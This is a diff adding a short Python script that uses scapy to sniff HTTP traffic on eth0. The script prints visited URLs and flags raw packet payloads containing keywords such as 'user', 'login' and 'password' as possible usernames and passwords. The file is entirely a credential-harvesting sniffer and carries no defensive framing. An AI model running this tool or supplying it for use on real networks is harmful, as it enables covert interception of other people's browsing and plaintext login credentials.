@@ -1,0 +1,32 @@
+#!usr/bin/env python
+import scapy.all as scapy
+from scapy.layers import http
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=call_back)
+
+def get_url(packet):
+    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return url
+
+def get_password(packet):
+    if packet.haslayer(scapy.Raw):
+            # print(packet[scapy.Raw].load)
+            load = packet[scapy.Raw].load
+            keyword = ["uname", "user", "login", "password", "pass"]
+            for key in keyword:
+                if key in load:
+                    return load
+
+def call_back(packet):
+    if packet.haslayer(http.HTTPRequest):
+        # print(packet.show())
+        url = get_url(packet)
+        print("url is  ...." + url)
+        passwords = get_password(packet)
+        if passwords:
+            print("\n\n possible username/password" + passwords + "\n\n")
+
+
+sniff("eth0")
+#python (filename)
